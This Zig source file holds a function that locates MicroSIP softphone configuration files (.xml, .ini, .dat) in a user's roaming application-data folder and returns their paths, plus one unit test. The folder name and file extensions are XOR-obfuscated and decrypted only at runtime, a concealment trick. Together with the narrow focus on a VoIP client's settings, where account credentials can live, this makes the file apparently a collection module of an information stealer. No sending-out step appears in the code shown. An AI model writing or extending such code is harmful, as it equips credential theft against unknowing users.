const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    const MICROSIP = hash.xorEncrypt("MicroSIP");
    const XML_EXT = hash.xorEncrypt(".xml");
    const INI_EXT = hash.xorEncrypt(".ini");
    const DAT_EXT = hash.xorEncrypt(".dat");
};

pub fn collect(allocator: std.mem.Allocator, roaming: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var ms_buf: [E.MICROSIP.len]u8 = undefined;
    var xml_ext_buf: [E.XML_EXT.len]u8 = undefined;
    var ini_ext_buf: [E.INI_EXT.len]u8 = undefined;
    var dat_ext_buf: [E.DAT_EXT.len]u8 = undefined;
    hash.xorDecrypt(&E.MICROSIP, &ms_buf);
    hash.xorDecrypt(&E.XML_EXT, &xml_ext_buf);
    hash.xorDecrypt(&E.INI_EXT, &ini_ext_buf);
    hash.xorDecrypt(&E.DAT_EXT, &dat_ext_buf);

    const base_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming, ms_buf[0..] });
    defer allocator.free(base_path);

    var dir = std.fs.openDirAbsolute(base_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();

    const exts = [_][]const u8{ xml_ext_buf[0..], ini_ext_buf[0..], dat_ext_buf[0..] };

    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const name = entry.name;
        var matched = false;
        for (exts) |ext| {
            if (std.mem.endsWith(u8, name, ext)) {
                matched = true;
                break;
            }
        }
        if (!matched) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ base_path, name });
        try files.append(full);
    }

    return files.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__microsip");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}
